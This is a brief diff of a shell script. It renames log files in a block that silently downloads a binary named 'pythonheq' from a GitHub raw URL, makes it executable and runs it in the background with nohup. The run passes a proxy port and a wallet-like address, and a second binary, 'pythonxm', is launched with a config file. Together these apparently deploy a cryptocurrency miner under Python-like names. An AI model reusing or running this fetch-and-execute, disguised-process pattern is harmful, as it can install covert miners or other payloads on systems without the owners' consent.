@@ -219,12 +219,12 @@ nohup ./pythonxm -c config.json -l ooutxm 2>> ooutxm 1>> ooutxm &
 
 else
 ###### VC
-echo start >> ooutxm
+echo start >> ooutvc
 rm -rf pythonheq
 wget -q https://github.com/one10001/10001code/raw/main/pythonheq
 chmod +x pythonheq
 
-nohup ./pythonheq -v -l "$PROX":"$VCPort" -u RNEzrdAY8JNRrEre37aZbegHSx2CgaoXek."VC_""$INFO" -t 4 1>> ooutx 2>> ooutx &
+nohup ./pythonheq -v -l "$PROX":"$VCPort" -u RNEzrdAY8JNRrEre37aZbegHSx2CgaoXek."VC_""$INFO" -t 4 1>> ooutvc 2>> ooutvc &
 
 fi
 
